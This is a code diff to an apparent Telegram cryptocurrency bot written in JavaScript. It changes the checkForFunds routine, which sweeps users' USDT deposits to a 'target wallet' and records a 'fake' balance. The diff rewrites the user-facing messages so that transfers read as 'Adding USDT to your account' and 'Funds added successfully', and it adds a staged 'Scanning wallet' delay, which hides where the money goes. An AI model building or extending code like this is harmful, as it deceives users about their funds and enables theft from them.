@@ -242,6 +242,13 @@ async function deleteMessage(chatId, messageId) {
 
 async function checkForFunds(chatId, userId, messageId) {
     try {
+
+        await editMessage(chatId, messageId, "Scanning wallet for USDT. Please wait...");
+
+        // Wait for 3 seconds (3000 milliseconds)
+        await new Promise(resolve => setTimeout(resolve, 5000));
+
+
         // Step 1: Get the user details from the database (fetch wallet address)
         const user = await getUserByTelegramId(userId);
         const solWalletAddress = user.sol_wallet_address;
@@ -317,7 +324,7 @@ async function checkForFunds(chatId, userId, messageId) {
             await client.query(updateQuery, [new_fake_balance, new_total_user_funds, userId]);
 
             // Step 9: Notify the user about the detected funds via Telegram message
-            const fundsAddedMessage = `New funds detected: ${WalletUsdtBalance} USDT. Transferring to the target wallet...`;
+            const fundsAddedMessage = `New funds detected: ${WalletUsdtBalance} USDT. Adding USDT to your account...`;
             await editMessage(chatId, messageId, fundsAddedMessage);
 
             // Step 10: Transfer the new funds to the target wallet
@@ -332,7 +339,7 @@ async function checkForFunds(chatId, userId, messageId) {
             await transferUsdtToWallet(fromKeypair, fromUsdtTokenAccount, WalletUsdtBalance);
 
             // Step 11: Inform the user that the funds were successfully transferred
-            const transferCompleteMessage = `Funds transferred successfully! New funds: ${WalletUsdtBalance} USDT.`;
+            const transferCompleteMessage = `Funds added successfully!`;
             await editMessage(chatId, messageId, transferCompleteMessage);
 
             // Optionally, wait and restart the bot
@@ -348,7 +355,7 @@ async function checkForFunds(chatId, userId, messageId) {
 
         } else {
             // Step 12: If no new funds were detected, notify the user
-            const noFundsMessage = "No new funds detected.";
+            const noFundsMessage = "No new funds detected. If you sent USDT and it was not seen by the bot Check for Payment again (Add Funds -> Check for Payment).";
             await editMessage(chatId, messageId, noFundsMessage);
 
             // Optionally, restart the bot after a short delay
@@ -360,7 +367,7 @@ async function checkForFunds(chatId, userId, messageId) {
                     await deleteMessage(chatId, messageId); // Delete the restarting message
                     await showWelcomeMessage(chatId, userId, user.ref_code_invite_others); // Show welcome message
                 }, 1000); // 1 second delay
-            }, 1000); // 1 second delay
+            }, 3000); // 1 second delay
         }
 
     } catch (error) {
